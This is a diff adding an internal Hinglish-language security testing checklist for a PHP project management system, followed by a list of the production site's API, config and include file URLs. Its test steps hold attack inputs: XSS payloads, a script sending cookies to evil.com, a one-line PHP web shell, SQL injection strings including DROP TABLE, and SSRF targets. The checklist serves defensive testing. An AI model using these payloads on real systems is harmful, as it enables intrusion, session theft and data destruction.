@@ -1,0 +1,1049 @@
+================================================================================
+         PMS PROJECT - VAPT MANUAL TESTING GUIDE
+         Project: Project Management System (PHP/MySQL)
+         Prepared for: Internal Security Testing
+================================================================================
+
+INSTRUCTIONS:
+- Har test ke baad PASS / FAIL / N/A likho
+- FAIL hone pe screenshot lo aur issue note karo
+- Testing environment: Staging/Production server pe karo, localhost pe nahi
+- Do alag browser use karo (Chrome + Firefox) testing ke liye
+
+================================================================================
+SECTION 1: HTTP SECURITY HEADERS
+================================================================================
+
+TEST 1.1 - Security Headers Check
+----------------------------------
+Steps:
+  1. Browser mein site kholo (https://yoursite.com)
+  2. F12 dabao > Network tab > koi bhi request click karo
+  3. Response Headers section dekho
+
+Expected Headers (sab hone chahiye):
+  [ ] X-Frame-Options: DENY
+  [ ] X-Content-Type-Options: nosniff
+  [ ] Strict-Transport-Security: max-age=31536000; includeSubDomains
+  [ ] Referrer-Policy: strict-origin-when-cross-origin
+  [ ] Content-Security-Policy: (kuch bhi value ho, blank nahi hona chahiye)
+  [ ] Permissions-Policy: (present hona chahiye)
+
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 1.2 - Clickjacking Protection
+------------------------------------
+Steps:
+  1. Ek HTML file banao locally:
+     <html><body>
+     <iframe src="https://yoursite.com/modules/auth/login.php" width="800" height="600"></iframe>
+     </body></html>
+  2. Browser mein kholo
+
+Expected: Iframe blank/blocked hona chahiye, site load nahi honi chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 1.3 - HTTPS Enforcement
+------------------------------
+Steps:
+  1. Browser mein http:// se site access karo: http://yoursite.com
+  2. Dekho kya https:// pe redirect hota hai
+
+Expected: Automatic redirect to HTTPS
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 1.4 - SSL/TLS Rating
+---------------------------
+Steps:
+  1. https://www.ssllabs.com/ssltest/ kholo
+  2. Apna domain enter karo
+  3. Rating dekho
+
+Expected: A ya A+ rating, TLS 1.0/1.1 disabled
+Result: PASS / FAIL
+Rating Mila: _______
+Notes: _______________________________________________
+
+
+================================================================================
+SECTION 2: AUTHENTICATION TESTING
+================================================================================
+
+TEST 2.1 - Brute Force Protection
+-----------------------------------
+Steps:
+  1. Login page kholo: /modules/auth/login.php
+  2. Sahi username, galat password se 5 baar login try karo
+  3. 6th attempt karo
+
+Expected: 6th attempt pe "account locked for 15 minutes" message aaye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 2.2 - Session Fixation
+-----------------------------
+Steps:
+  1. Login page kholo, F12 > Application > Cookies > session cookie ID note karo
+  2. Login karo
+  3. Login ke baad session cookie ID dobara note karo
+
+Expected: Login ke baad session ID change honi chahiye (different value)
+Result: PASS / FAIL
+Before Login Session ID: _______________
+After Login Session ID:  _______________
+Notes: _______________________________________________
+
+TEST 2.3 - Session After Logout
+---------------------------------
+Steps:
+  1. Login karo, koi page kholo (e.g., /modules/admin/dashboard.php)
+  2. Logout karo
+  3. Browser back button dabao
+  4. Ya directly URL type karo: /modules/admin/dashboard.php
+
+Expected: Login page pe redirect hona chahiye, dashboard nahi dikhna chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 2.4 - Session Timeout (Idle)
+-----------------------------------
+Steps:
+  1. Login karo
+  2. 31 minutes tak kuch mat karo (browser open rakho)
+  3. Koi bhi page refresh karo ya API call karo
+
+Expected: Login page pe redirect hona chahiye (30 min idle timeout)
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 2.5 - Force Password Reset Bypass
+----------------------------------------
+Steps:
+  1. Bina login ke directly access karo:
+     /modules/auth/force_reset.php
+
+Expected: Login page pe redirect hona chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 2.6 - Password Complexity
+--------------------------------
+Steps:
+  1. Login karo, force_reset page pe jao
+  2. Weak passwords try karo:
+     - "12345678" (no uppercase, no special char)
+     - "Password1" (no special char)
+     - "Pass@1" (less than 8 chars)
+     - "password@1" (no uppercase)
+
+Expected: Sab reject hone chahiye with proper error message
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 2.7 - Username Enumeration
+---------------------------------
+Steps:
+  1. Login page pe valid username + wrong password dalo
+  2. Invalid username + wrong password dalo
+  3. Dono error messages compare karo
+
+Expected: Dono cases mein same generic message: "Invalid username or password"
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+
+================================================================================
+SECTION 3: AUTHORIZATION / IDOR TESTING
+================================================================================
+
+TEST 3.1 - Horizontal Privilege Escalation (IDOR)
+---------------------------------------------------
+Setup: Do accounts banao - User A (ft_tester) aur User B (qa)
+
+Steps:
+  1. User A se login karo
+  2. User B ka user_id note karo (admin panel se)
+  3. Ye URLs try karo User A ke session se:
+     GET /api/user_hours.php?user_id=<UserB_ID>&date=2026-03-22
+     GET /api/get_original_data.php?user_id=<UserB_ID>&date=2026-03-22
+
+Expected: 403 Access Denied aana chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 3.2 - Vertical Privilege Escalation (Admin Pages)
+--------------------------------------------------------
+Steps:
+  1. Non-admin account se login karo (qa ya ft_tester)
+  2. Ye admin URLs directly access karo:
+     /modules/admin/users.php
+     /modules/admin/repair_db.php
+     /modules/admin/dashboard.php
+     /modules/admin/bulk_hours_management.php
+     /api/admin_vault.php?action=get_credentials
+     /api/admin_project_users.php
+
+Expected: Sab pe redirect to login ya 403 aana chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 3.3 - API Role Bypass
+----------------------------
+Steps:
+  1. ft_tester account se login karo
+  2. Postman ya browser se ye POST request bhejo:
+     POST /api/feedback.php
+     action=delete_feedback&feedback_id=1
+
+Expected: "Permission denied" response aana chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 3.4 - Cross-Project Data Access
+--------------------------------------
+Steps:
+  1. User A ko Project 1 pe assign karo, Project 2 pe nahi
+  2. User A se login karo
+  3. Project 2 ka data access karne ki koshish karo:
+     GET /api/issues.php?project_id=<Project2_ID>
+     GET /api/project_pages.php?project_id=<Project2_ID>
+
+Expected: Empty data ya 403 aana chahiye, Project 2 ka data nahi
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+
+================================================================================
+SECTION 4: XSS (CROSS-SITE SCRIPTING) TESTING
+================================================================================
+
+TEST 4.1 - Stored XSS - Chat
+------------------------------
+Steps:
+  1. Login karo, kisi project ka chat kholo
+  2. Ye messages bhejo ek ek karke:
+     <script>alert('XSS1')</script>
+     <img src=x onerror=alert('XSS2')>
+     "><svg onload=alert('XSS3')>
+     javascript:alert('XSS4')
+  3. Page refresh karo, messages dobara dekho
+
+Expected: Alert popup nahi aana chahiye, text as-is ya escaped dikhna chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 4.2 - Stored XSS - Feedback
+----------------------------------
+Steps:
+  1. Feedback submit karo with content:
+     <script>document.location='http://evil.com?c='+document.cookie</script>
+  2. Admin se feedback dekho
+
+Expected: Script execute nahi honi chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 4.3 - Stored XSS - Issue Description
+-------------------------------------------
+Steps:
+  1. Naya issue create karo, description mein dalo:
+     <script>alert('issue-xss')</script>
+     <iframe src="javascript:alert('xss')"></iframe>
+  2. Issue save karo aur dobara kholo
+
+Expected: Alert nahi aana chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 4.4 - Reflected XSS - URL Parameters
+-------------------------------------------
+Steps:
+  1. Ye URLs browser mein try karo:
+     /modules/auth/login.php?error=<script>alert(1)</script>
+     /modules/auth/login.php?logout=<img src=x onerror=alert(1)>
+
+Expected: Script execute nahi honi chahiye, text escaped dikhna chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+
+================================================================================
+SECTION 5: CSRF (CROSS-SITE REQUEST FORGERY) TESTING
+================================================================================
+
+TEST 5.1 - CSRF Token Validation
+----------------------------------
+Steps:
+  1. Apne computer pe ek file banao: csrf_test.html
+     Content:
+     <html><body>
+     <form id="f" action="https://yoursite.com/api/feedback.php" method="POST">
+       <input name="action" value="submit_feedback">
+       <input name="content" value="CSRF Attack Test">
+     </form>
+     <script>document.getElementById('f').submit()</script>
+     </body></html>
+  2. Site pe login karo
+  3. Naye tab mein csrf_test.html kholo (file:// se)
+
+Expected: "Invalid or missing CSRF token" - 403 response aana chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 5.2 - CSRF on State-Changing APIs
+----------------------------------------
+Steps:
+  1. Burp Suite ya browser DevTools se koi POST request capture karo
+  2. csrf_token parameter remove karo ya change karo
+  3. Request dobara bhejo
+
+Expected: 403 response aana chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+
+================================================================================
+SECTION 6: FILE UPLOAD TESTING
+================================================================================
+
+TEST 6.1 - Malicious File Upload (PHP)
+----------------------------------------
+Steps:
+  1. Ek file banao: shell.php
+     Content: <?php system($_GET['cmd']); ?>
+  2. Issue upload ya chat upload se upload karne ki koshish karo
+
+Expected: "Invalid file type" error aana chahiye, upload reject hona chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 6.2 - Double Extension Bypass
+------------------------------------
+Steps:
+  1. File banao: shell.php.jpg
+     Content: <?php echo "hacked"; ?>
+  2. Upload karne ki koshish karo
+
+Expected: Reject hona chahiye ya agar upload ho toh PHP execute nahi hona chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 6.3 - File Size Limit
+----------------------------
+Steps:
+  1. 11MB se badi image banao (ya koi bhi file)
+  2. Upload karne ki koshish karo
+
+Expected: "File too large" error aana chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 6.4 - Uploaded File Execution Check
+------------------------------------------
+Steps:
+  1. Koi valid image upload karo (e.g., test.jpg)
+  2. Upload hone ke baad URL note karo
+  3. URL mein .php extension add karke access karne ki koshish karo
+  4. /uploads/ folder directly browser se access karo
+
+Expected: PHP execute nahi hona chahiye, directory listing nahi dikhni chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+
+================================================================================
+SECTION 7: SENSITIVE FILE / DIRECTORY EXPOSURE
+================================================================================
+
+TEST 7.1 - Config Files Access
+--------------------------------
+Steps: Ye URLs browser mein directly type karo:
+  [ ] https://yoursite.com/config/database.php
+      Expected: Blank page ya 403, DB credentials nahi dikhne chahiye
+  [ ] https://yoursite.com/config/settings.php
+      Expected: Blank page ya 403
+  [ ] https://yoursite.com/.env (agar exist kare)
+      Expected: 404 ya 403
+
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 7.2 - Git Repository Exposure
+------------------------------------
+Steps:
+  [ ] https://yoursite.com/.git/config
+      Expected: 403 Forbidden
+  [ ] https://yoursite.com/.git/HEAD
+      Expected: 403 Forbidden
+
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 7.3 - Log Files Access
+-----------------------------
+Steps:
+  [ ] https://yoursite.com/tmp/logs/issues_api.log
+      Expected: 403 Forbidden
+  [ ] https://yoursite.com/tmp/
+      Expected: 403 Forbidden, directory listing nahi
+
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 7.4 - Directory Listing
+------------------------------
+Steps: Ye directories browser mein access karo:
+  [ ] https://yoursite.com/uploads/
+  [ ] https://yoursite.com/assets/uploads/
+  [ ] https://yoursite.com/includes/
+  [ ] https://yoursite.com/config/
+  [ ] https://yoursite.com/api/
+
+Expected: Sab pe 403 ya redirect, file listing nahi dikhni chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 7.5 - repair_db.php Production Access
+--------------------------------------------
+Steps:
+  1. Super admin se login karo
+  2. Production server pe access karo:
+     https://yoursite.com/modules/admin/repair_db.php
+
+Expected: "This utility is disabled in production" - 403 aana chahiye
+  (Sirf localhost pe accessible hona chahiye)
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+
+================================================================================
+SECTION 8: SQL INJECTION TESTING
+================================================================================
+
+TEST 8.1 - Login SQL Injection
+--------------------------------
+Steps:
+  1. Login page pe username field mein dalo:
+     ' OR '1'='1
+     admin'--
+     ' OR 1=1--
+  2. Password kuch bhi dalo
+
+Expected: "Invalid username or password" - login nahi hona chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 8.2 - API Parameter Injection
+------------------------------------
+Steps:
+  1. Login karo
+  2. Ye URLs try karo:
+     /api/user_hours.php?user_id=1' OR '1'='1&date=2026-03-22
+     /api/user_hours.php?user_id=1; DROP TABLE users--&date=2026-03-22
+     /api/issues.php?project_id=1 UNION SELECT 1,2,3--
+
+Expected: Error ya empty response, DB data leak nahi hona chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+
+================================================================================
+SECTION 9: RATE LIMITING TESTING
+================================================================================
+
+TEST 9.1 - Login Rate Limiting
+--------------------------------
+Steps:
+  1. Login page pe same username se 6 baar galat password dalo
+  2. Har attempt ke baad response note karo
+
+Expected:
+  Attempts 1-5: "Invalid username or password"
+  Attempt 6+: "Too many failed login attempts. Locked for 15 minutes."
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 9.2 - File Upload Rate Limiting
+--------------------------------------
+Steps:
+  1. Login karo
+  2. 21 images ek ke baad ek upload karo (issue upload)
+
+Expected: 21st upload pe "Too many uploads. Please wait." - 429 error
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 9.3 - Chat Rate Limiting
+-------------------------------
+Steps:
+  1. Login karo, project chat kholo
+  2. 31 messages rapidly bhejo (copy-paste se)
+
+Expected: 31st message pe "Too many messages. Please slow down." - 429 error
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+
+================================================================================
+SECTION 10: INFORMATION DISCLOSURE TESTING
+================================================================================
+
+TEST 10.1 - Error Message Disclosure
+--------------------------------------
+Steps:
+  1. Login karo
+  2. Ye invalid requests bhejo:
+     GET /api/user_hours.php?user_id=999999&date=invalid-date
+     GET /api/get_original_data.php?user_id=abc&date=xyz
+
+Expected: Generic error message, koi DB details / stack trace nahi
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 10.2 - PHP Error Display
+-------------------------------
+Steps:
+  1. Koi bhi page URL mein invalid parameter dalo
+  2. Server response mein PHP warnings/errors check karo
+
+Expected: Koi PHP error/warning browser mein nahi dikhna chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 10.3 - Server Version Disclosure
+---------------------------------------
+Steps:
+  1. F12 > Network > koi response > Headers dekho
+  2. "Server" header check karo
+
+Expected: Server header ya blank hona chahiye ya generic, version number nahi
+  e.g., "Apache" is ok, "Apache/2.4.51 (Ubuntu)" is NOT ok
+Result: PASS / FAIL
+Server Header Value: _______________
+Notes: _______________________________________________
+
+TEST 10.4 - API Response Sensitive Data
+-----------------------------------------
+Steps:
+  1. Login karo
+  2. GET /api/user_hours.php?user_id=<your_id>&date=2026-03-22
+  3. Response JSON dekho
+
+Expected: Response mein "debug_info", "is_admin", "columns_exist" fields nahi hone chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+
+================================================================================
+SECTION 11: BUSINESS LOGIC TESTING
+================================================================================
+
+TEST 11.1 - Role Escalation via Profile Edit
+----------------------------------------------
+Steps:
+  1. ft_tester se login karo
+  2. Profile edit request bhejo with role=admin:
+     POST /api/status.php
+     action=update_profile&role=admin
+
+Expected: Role change nahi hona chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 11.2 - Negative Hours Submission
+---------------------------------------
+Steps:
+  1. Login karo
+  2. Time log submit karo with negative hours:
+     hours_spent = -5
+     hours_spent = 999999
+
+Expected: Validation error aana chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 11.3 - Accessing Other User's Vault
+------------------------------------------
+Steps:
+  1. Admin A se login karo, vault mein kuch credentials add karo
+  2. Admin B se login karo
+  3. GET /api/admin_vault.php?action=get_credentials
+
+Expected: Sirf Admin B ke credentials dikhne chahiye, Admin A ke nahi
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 11.4 - Export Without Permission
+---------------------------------------
+Steps:
+  1. ft_tester se login karo
+  2. POST /api/export_issues.php bhejo
+
+Expected: Permission denied ya 403
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+
+================================================================================
+SECTION 12: COOKIE SECURITY TESTING
+================================================================================
+
+TEST 12.1 - Cookie Flags
+--------------------------
+Steps:
+  1. Login karo
+  2. F12 > Application > Cookies > session cookie click karo
+  3. Flags check karo
+
+Expected:
+  [ ] HttpOnly: true (checked hona chahiye)
+  [ ] Secure: true (HTTPS pe checked hona chahiye)
+  [ ] SameSite: Strict ya Lax
+
+Result: PASS / FAIL
+HttpOnly: YES / NO
+Secure:   YES / NO
+SameSite: _______________
+Notes: _______________________________________________
+
+
+================================================================================
+SECTION 13: SSRF TESTING (Accessibility Scan Feature)
+================================================================================
+
+TEST 13.1 - SSRF via Scan URL
+-------------------------------
+Steps:
+  1. Admin/Project Lead se login karo
+  2. Kisi project ke page ki URL ko edit karo, set karo:
+     http://localhost/
+     http://127.0.0.1/
+     http://192.168.1.1/
+     http://169.254.169.254/ (AWS metadata)
+  3. Accessibility scan trigger karo
+
+Expected: "Page URL is empty or invalid" error aana chahiye, scan nahi hona chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 13.2 - SSRF via scan_urls Parameter
+------------------------------------------
+Steps:
+  1. Burp Suite se accessibility scan POST request intercept karo
+  2. scan_urls parameter mein add karo:
+     ["http://127.0.0.1:3306", "http://localhost:22"]
+
+Expected: Invalid URL error, internal ports scan nahi hone chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+
+================================================================================
+SECTION 14: LOGOUT & SESSION MANAGEMENT
+================================================================================
+
+TEST 14.1 - Proper Session Destruction
+----------------------------------------
+Steps:
+  1. Login karo, session cookie value note karo
+  2. Logout karo
+  3. Same session cookie value ke saath koi API call karo manually (Postman se)
+
+Expected: 401 Unauthorized aana chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+TEST 14.2 - Concurrent Session
+--------------------------------
+Steps:
+  1. Chrome mein login karo
+  2. Firefox mein same account se login karo
+  3. Admin panel se Chrome ka session force logout karo
+  4. Chrome mein koi page refresh karo
+
+Expected: Chrome mein login page pe redirect hona chahiye
+Result: PASS / FAIL
+Notes: _______________________________________________
+
+
+================================================================================
+FINAL CHECKLIST SUMMARY
+================================================================================
+
+Section 1  - HTTP Security Headers      : PASS / FAIL
+Section 2  - Authentication             : PASS / FAIL
+Section 3  - Authorization / IDOR       : PASS / FAIL
+Section 4  - XSS                        : PASS / FAIL
+Section 5  - CSRF                       : PASS / FAIL
+Section 6  - File Upload                : PASS / FAIL
+Section 7  - Sensitive File Exposure    : PASS / FAIL
+Section 8  - SQL Injection              : PASS / FAIL
+Section 9  - Rate Limiting              : PASS / FAIL
+Section 10 - Information Disclosure     : PASS / FAIL
+Section 11 - Business Logic             : PASS / FAIL
+Section 12 - Cookie Security            : PASS / FAIL
+Section 13 - SSRF                       : PASS / FAIL
+Section 14 - Session Management         : PASS / FAIL
+
+Overall Result: PASS / FAIL
+
+Tester Name: _______________________________________________
+Test Date:   _______________________________________________
+Environment: _______________________________________________
+
+================================================================================
+NOTES / ISSUES FOUND:
+================================================================================
+
+1. _______________________________________________
+2. _______________________________________________
+3. _______________________________________________
+4. _______________________________________________
+5. _______________________________________________
+
+================================================================================
+END OF VAPT MANUAL TESTING GUIDE
+================================================================================
+
+
+================================================================================
+SECTION 15: PROJECT FILE URL LIST (Browser Direct Access Testing)
+================================================================================
+
+Ye saare URLs browser mein directly open karo aur check karo:
+- PHP files: Blank page ya 403 aana chahiye (code visible nahi hona chahiye)
+- Config files: 403 ya 404 aana chahiye
+- JS/CSS files: Accessible hain (ye public assets hain) - EXPECTED PASS
+- .htaccess files: 403 aana chahiye
+- SQL/JSON/txt files: 403 ya 404 aana chahiye
+
+FORMAT: URL | Expected Result | Actual Result | PASS/FAIL
+
+--------------------------------------------------------------------------------
+ROOT FILES
+--------------------------------------------------------------------------------
+https://athenaeumtransformation.com/.htaccess                                    | 403 Forbidden
+https://athenaeumtransformation.com/index.php                                    | Login redirect or app load
+https://athenaeumtransformation.com/VAPT_Manual_Testing_Guide.txt                | 403 Forbidden
+https://athenaeumtransformation.com/package.json                                 | 403 Forbidden
+https://athenaeumtransformation.com/package-lock.json                            | 403 Forbidden
+
+--------------------------------------------------------------------------------
+API FILES (should return JSON with auth error, NOT PHP source code)
+--------------------------------------------------------------------------------
+https://athenaeumtransformation.com/api/.htaccess                                | 403 Forbidden
+https://athenaeumtransformation.com/api/accessibility_scan.php                   | JSON auth error (not PHP code)
+https://athenaeumtransformation.com/api/admin_project_users.php                  | JSON auth error
+https://athenaeumtransformation.com/api/admin_qa_breakdown.php                   | JSON auth error
+https://athenaeumtransformation.com/api/admin_user_projects.php                  | JSON auth error
+https://athenaeumtransformation.com/api/admin_vault.php                          | JSON auth error
+https://athenaeumtransformation.com/api/chat.php                                 | JSON auth error
+https://athenaeumtransformation.com/api/chat_actions.php                         | JSON auth error
+https://athenaeumtransformation.com/api/chat_unread_count.php                    | JSON auth error
+https://athenaeumtransformation.com/api/chat_upload_image.php                    | JSON auth error
+https://athenaeumtransformation.com/api/client_dashboard.php                     | JSON auth error
+https://athenaeumtransformation.com/api/client_export.php                        | JSON auth error
+https://athenaeumtransformation.com/api/devices.php                              | JSON auth error
+https://athenaeumtransformation.com/api/edit_requests.php                        | JSON auth error
+https://athenaeumtransformation.com/api/email_preferences.php                    | JSON auth error
+https://athenaeumtransformation.com/api/export_client_report.php                 | JSON auth error
+https://athenaeumtransformation.com/api/export_download.php                      | JSON auth error
+https://athenaeumtransformation.com/api/export_issues.php                        | JSON auth error
+https://athenaeumtransformation.com/api/export_overview_data.php                 | JSON auth error
+https://athenaeumtransformation.com/api/feedback.php                             | JSON auth error
+https://athenaeumtransformation.com/api/force_logout_session.php                 | JSON auth error
+https://athenaeumtransformation.com/api/generic_tasks.php                        | JSON auth error
+https://athenaeumtransformation.com/api/get_original_data.php                    | JSON auth error
+https://athenaeumtransformation.com/api/get_pending_changes.php                  | JSON auth error
+https://athenaeumtransformation.com/api/hours_reminder.php                       | JSON auth error
+https://athenaeumtransformation.com/api/issue_comments.php                       | JSON auth error
+https://athenaeumtransformation.com/api/issue_config.php                         | JSON auth error
+https://athenaeumtransformation.com/api/issue_drafts.php                         | JSON auth error
+https://athenaeumtransformation.com/api/issue_history.php                        | JSON auth error
+https://athenaeumtransformation.com/api/issue_presets.php                        | JSON auth error
+https://athenaeumtransformation.com/api/issue_templates.php                      | JSON auth error
+https://athenaeumtransformation.com/api/issue_titles.php                         | JSON auth error
+https://athenaeumtransformation.com/api/issue_upload_image.php                   | JSON auth error
+https://athenaeumtransformation.com/api/issues.php                               | JSON auth error
+https://athenaeumtransformation.com/api/mark_chat_read.php                       | JSON auth error
+https://athenaeumtransformation.com/api/project_hours.php                        | JSON auth error
+https://athenaeumtransformation.com/api/project_pages.php                        | JSON auth error
+https://athenaeumtransformation.com/api/projects.php                             | JSON auth error
+https://athenaeumtransformation.com/api/public_image.php                         | JSON auth error or image
+https://athenaeumtransformation.com/api/qa_breakdown.php                         | JSON auth error
+https://athenaeumtransformation.com/api/regression_actions.php                   | JSON auth error
+https://athenaeumtransformation.com/api/secure_file.php                          | JSON auth error
+https://athenaeumtransformation.com/api/serve_template.php                       | JSON auth error
+https://athenaeumtransformation.com/api/status.php                               | JSON auth error
+https://athenaeumtransformation.com/api/tasks.php                                | JSON auth error
+https://athenaeumtransformation.com/api/update_env_status.php                    | JSON auth error
+https://athenaeumtransformation.com/api/update_page_status.php                   | JSON auth error
+https://athenaeumtransformation.com/api/update_phase.php                         | JSON auth error
+https://athenaeumtransformation.com/api/update_project_status.php                | JSON auth error
+https://athenaeumtransformation.com/api/user_hours.php                           | JSON auth error
+
+--------------------------------------------------------------------------------
+CONFIG FILES (must be blocked - CRITICAL)
+--------------------------------------------------------------------------------
+https://athenaeumtransformation.com/config/cache_production.php                  | 403 Forbidden (CRITICAL)
+https://athenaeumtransformation.com/config/constants.php                         | 403 Forbidden (CRITICAL)
+https://athenaeumtransformation.com/config/database.php                          | 403 Forbidden (CRITICAL)
+https://athenaeumtransformation.com/config/email_production.php                  | 403 Forbidden (CRITICAL)
+https://athenaeumtransformation.com/config/init_production.php                   | 403 Forbidden (CRITICAL)
+https://athenaeumtransformation.com/config/performance.php                       | 403 Forbidden (CRITICAL)
+https://athenaeumtransformation.com/config/production.php                        | 403 Forbidden (CRITICAL)
+https://athenaeumtransformation.com/config/redis.php                             | 403 Forbidden (CRITICAL)
+https://athenaeumtransformation.com/config/settings.php                          | 403 Forbidden (CRITICAL)
+https://athenaeumtransformation.com/config/storage_production.php                | 403 Forbidden (CRITICAL)
+https://athenaeumtransformation.com/config/timezone.php                          | 403 Forbidden (CRITICAL)
+
+--------------------------------------------------------------------------------
+CLIENT FILES
+--------------------------------------------------------------------------------
+https://athenaeumtransformation.com/client/.htaccess                             | 403 Forbidden
+https://athenaeumtransformation.com/client/ajax_widget.php                       | 403 or auth redirect
+https://athenaeumtransformation.com/client/index.php                             | Login page or client portal
+
+--------------------------------------------------------------------------------
+INCLUDES FILES (must be blocked - source code exposure risk)
+--------------------------------------------------------------------------------
+https://athenaeumtransformation.com/includes/auth.php                            | 403 Forbidden
+https://athenaeumtransformation.com/includes/backup.php                          | 403 Forbidden
+https://athenaeumtransformation.com/includes/chat_helpers.php                    | 403 Forbidden
+https://athenaeumtransformation.com/includes/client_page_template.php            | 403 Forbidden
+https://athenaeumtransformation.com/includes/client_permissions.php              | 403 Forbidden
+https://athenaeumtransformation.com/includes/email.php                           | 403 Forbidden
+https://athenaeumtransformation.com/includes/excel_reader.php                    | 403 Forbidden
+https://athenaeumtransformation.com/includes/footer.php                          | 403 Forbidden
+https://athenaeumtransformation.com/includes/functions.php                       | 403 Forbidden
+https://athenaeumtransformation.com/includes/header.php                          | 403 Forbidden
+https://athenaeumtransformation.com/includes/helpers.php                         | 403 Forbidden
+https://athenaeumtransformation.com/includes/hours_validation.php                | 403 Forbidden
+https://athenaeumtransformation.com/includes/project_permissions.php             | 403 Forbidden
+https://athenaeumtransformation.com/includes/universal_header.php                | 403 Forbidden
+https://athenaeumtransformation.com/includes/controllers/AdminAssignmentController.php       | 403 Forbidden
+https://athenaeumtransformation.com/includes/controllers/ClientAuthenticationController.php  | 403 Forbidden
+https://athenaeumtransformation.com/includes/controllers/ClientDashboardController.php       | 403 Forbidden
+https://athenaeumtransformation.com/includes/controllers/ClientExportController.php          | 403 Forbidden
+https://athenaeumtransformation.com/includes/controllers/ProjectAnalyticsController.php      | 403 Forbidden
+https://athenaeumtransformation.com/includes/controllers/UnifiedDashboardController.php      | 403 Forbidden
+https://athenaeumtransformation.com/includes/exceptions/UnauthorizedAccessException.php      | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/AnalyticsEngine.php          | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/AnalyticsReport.php          | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/AuditLogger.php              | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/BlockerIssuesAnalytics.php   | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/CacheManager.php             | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/ClientAccessControlManager.php | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/ClientProjectAssignment.php  | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/ClientUser.php               | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/CommentedIssuesAnalytics.php | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/CommonIssuesAnalytics.php    | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/ComplianceTrendAnalytics.php | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/ErrorHandler.php             | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/ExcelExporter.php            | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/ExportEngine.php             | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/ExportRequest.php            | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/NotificationManager.php      | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/PageIssuesAnalytics.php      | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/PDFExporter.php              | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/ProjectAssignmentManager.php | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/SecurityValidator.php        | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/SeverityAnalytics.php        | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/UserAffectedAnalytics.php    | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/VisualizationRenderer.php    | 403 Forbidden
+https://athenaeumtransformation.com/includes/models/WCAGComplianceAnalytics.php  | 403 Forbidden
+https://athenaeumtransformation.com/includes/templates/admin/assignment_interface.php        | 403 Forbidden
+https://athenaeumtransformation.com/includes/templates/client/404.php            | 403 Forbidden
+https://athenaeumtransformation.com/includes/templates/client/dashboard.php      | 403 Forbidden
+https://athenaeumtransformation.com/includes/templates/client/error.php          | 403 Forbidden
+https://athenaeumtransformation.com/includes/templates/client/no_projects.php    | 403 Forbidden
+https://athenaeumtransformation.com/includes/templates/client/project_view.php   | 403 Forbidden
+https://athenaeumtransformation.com/includes/templates/email/assignment_notification.php     | 403 Forbidden
+https://athenaeumtransformation.com/includes/templates/email/export_ready.html   | 403 Forbidden
+https://athenaeumtransformation.com/includes/templates/email/periodic_summary.php | 403 Forbidden
+https://athenaeumtransformation.com/includes/templates/email/preferences_page.php | 403 Forbidden
